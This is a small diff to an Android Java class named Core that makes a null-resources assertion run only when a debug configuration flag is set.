@@ -68,7 +68,7 @@ public class Core extends Activity implements Runnable {
 		resources = r;
 		contentResolver = cr;
 
-		Check.asserts(resources != null, "Null Resources");
+		if(Cfg.DEBUG) Check.asserts(resources != null, "Null Resources");
 
 		try {
 			coreThread.start();
